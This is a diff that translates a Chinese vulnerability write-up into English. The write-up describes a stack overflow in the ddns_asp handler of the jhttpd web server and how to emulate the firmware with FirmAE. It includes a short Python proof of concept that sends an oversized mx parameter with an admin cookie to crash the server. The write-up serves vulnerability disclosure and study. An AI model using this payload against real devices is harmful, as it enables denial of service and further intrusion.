@@ -1,20 +1,20 @@
-在jhttpd的ddns_asp函数中，会获取若干参数
+In the ddns_asp function of jhttpd, several parameters are obtained
 
-![img](file:///picture\pic1.png) 
+![img](./picture/pic1.png) 
 
-![img](file:///picture\pic2.png) 
+![img](./picture\pic2.png) 
 
-如果opt=add，那么后面的参数会通过sprintf函数被拼接到栈上变量
+If opt=add, then the following arguments will be concatenated to the stack variable via the sprintf function
 
-![img](file:///picture\pic3.png) 
+![img](./picture\pic3.png) 
 
-由于未对参数长度进行校验，导致在拼接时会由于参数过长造成栈溢出漏洞
+Because the parameter length is not verified, the stack overflow vulnerability will be caused by the long parameter during splicing
 
-还是利用FirmAE可以直接进行模拟，连接shell，在里面运行jhttpd
+Or use FirmAE to simulate directly, connect to the shell, and run jhttpd in it
 
-![img](file:///picture\pic4.png) 
+![img](./picture\pic4.png) 
 
-然后发送payload
+and then send the payload
 
 import requests
 url="http://192.168.0.1/ddns.asp?opt=add&mx="+'0'*0x1000
@@ -22,6 +22,6 @@ headers={"cookie":"wys_userid=admin,wys_passwd=520E1BFD4CDE217D0A5824AE7EA60632"
 response=requests.get(url=url,headers=headers)
 print(response.text)
 
-发现jhttpd发生了段错误，由此证明漏洞存在
+A segfault was found in jhttpd, which proves that the vulnerability exists
 
-![img](file:///picture\pic5.png) 
+![img](./picture\pic5.png) 
